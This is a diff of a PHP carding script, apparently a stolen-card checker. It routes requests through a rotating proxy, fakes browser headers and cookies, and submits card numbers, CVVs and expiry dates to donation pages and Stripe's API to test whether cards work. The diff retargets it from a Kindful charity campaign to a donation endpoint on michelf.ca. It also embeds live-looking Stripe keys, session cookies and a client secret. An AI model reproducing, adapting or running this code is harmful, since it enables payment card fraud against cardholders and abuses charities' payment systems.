@@ -116,20 +116,20 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://soworldwide.kindful.com/campaigns/247186/create_intent');
+curl_setopt($ch, CURLOPT_URL, 'https://michelf.ca/processus/co2.php?lang=en');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-  'authority: soworldwide.kindful.com',
+  'authority: michelf.ca',
   'method: POST',
-  'path: /campaigns/247186/create_intent',
+  'path: /processus/co2.php',
   'scheme: https',
-  'accept: application/json, text/javascript, */*; q=0.01',
+  'accept: application/json',
   'accept-language: en-US,en;q=0.5',
-  'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-  'Cookie: _session_id=2ba714095b16c1bb7e6c847d9848d2d7; _ga=GA1.2.405137457.1647800039; _gid=GA1.2.1913839444.1647800039; __stripe_mid=c5aaaf3a-e621-4076-9d3a-03c26980afc57cc471; __stripe_sid=c38c141a-2e0f-43d5-bb82-0d846fa41543feed90',
-  'origin: https://soworldwide.kindful.com',
-  'referer: https://soworldwide.kindful.com/campaigns/247186?utf8=%E2%9C%93&campaigns=247186&amount=0.50&recurring=landing_recurring&frequency=',
+  'content-type: application/json',
+  'Cookie: __stripe_sid=0f73d25a-75d7-4cb2-9e06-6d52784c215dc492be; __stripe_mid=ad03831d-3525-46e7-92b6-df6a84c760710eb964',
+  'origin: https://michelf.ca',
+  'referer: https://michelf.ca/donate/',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-site',
@@ -144,7 +144,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&authenticity_token='.$token.'&campaign_id=247186&non_tax_deduct_amount=&non_tax_deduct_description=&note=&designation_id=&amount=0.50&donate_to_pledge=true&pledge_id=&w=&payment_method=credit_card&credit_card%5Bfirst_name%5D='.$firstname.'&credit_card%5Blast_name%5D='.$lastname.'&bank_account%5Bfirst_name%5D=&bank_account%5Blast_name%5D=&email='.$email.'&billing_address%5Baddress%5D='.$street.'&billing_address%5Bcity%5D='.$city.'&billing_address%5Bstate%5D='.$state.'&billing_address%5Bpostal_code%5D='.$zip.'&phone_number='.$phone.'&billing_address%5Bcountry%5D=United+States&bank_account%5Baccount_type%5D=&bank_account_name=&bank_account%5Brouting_number%5D=&bank_account%5Baccount_number%5D=&non_widget_donate=true&locale=en&guest_user=true&allow_zero_dollar_amount=false&X-Tab-Token=4fe03f61-cf6b-8fbb-a87f-a3ece0a21cbc');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"currency":"USD","items":[],"subtotal":0,"tax":[],"total":500,"donation":500,"pmeth":"cc","billing":{"name":"'.$name.'+'.$last.'","email":"'.$email.'","company":"","address1":"","address2":"","city":"","zip":"","country":"US","state":"US-NY"},"message":"","tz-offset":-360,"invoice_no":null}');
 
 
 
@@ -184,7 +184,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 ));
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$firstname.'+'.$lastname.'&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][city]='.$city.'&payment_method_data[billing_details][address][state]='.$state.'&payment_method_data[billing_details][address][postal_code]='.$zip.'&payment_method_data[billing_details][email]='.$email.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&payment_method_data[muid]=c5aaaf3a-e621-4076-9d3a-03c26980afc57cc471&payment_method_data[sid]=c38c141a-2e0f-43d5-bb82-0d846fa41543feed90&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&payment_method_data[time_on_page]=76381&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_515TJY7KS05Pg4ROd3HA6PojIgZoR4CKQdChepBjxZ48vzTMxrs0ScMPS3rmKAdZ5DBljARGrynLpNGIov7ztFKcg00e3OgNFL5&client_secret=pi_3KfTHoKS05Pg4ROd13XV8tiL_secret_lbuTUmEHKnWal1sGPeRgPeeKP');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'time_on_page=61965&pasted_fields=number&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key=pk_live_40NCEKUf6u3XJpkF8zHm0rI1PchkWAS0Z1E7ygiVurV1V6P5yiJlHFtA6pfC93nhRWXwY9Bx1350DRlIGNXHKLpuG0040r5a1LY&payment_user_agent=stripe.js%2F78ef418&card[name]='.$name.'+'.$last.'&card[address_state]=NY&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
 
 
 $result2 = curl_exec($ch);
